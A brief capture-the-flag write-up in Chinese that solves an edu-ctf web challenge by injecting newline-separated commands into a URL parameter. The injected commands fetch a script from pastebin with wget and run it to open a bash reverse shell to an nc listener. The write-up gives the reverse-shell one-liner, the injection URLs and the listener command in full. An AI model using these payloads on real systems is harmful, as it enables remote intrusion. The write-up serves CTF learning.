# 解法
透過 https://pastebin.com 把回傳 shell 的code 放到網路上 
code : `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`
在透過 ％0a 去換行，讓 shell 去執行 wget 下載我們的 code
`https://edu-ctf.csie.org:10153/?me0w=%0awget%20<網址>%20-O%20/tmp/zodf`
在本地端透過 nc 去開一個 port 去聽回傳 `$nc -vlk 6666`

之後在網站上執行 sh 讓他回傳 shell 
`https://edu-ctf.csie.org:10153/?me0w=%0ash%20/tmp/zodf`
就能拿到 flag 了，他 flag 有設權限不能直接開，所以要透過他裡面的 readflag 去開啟
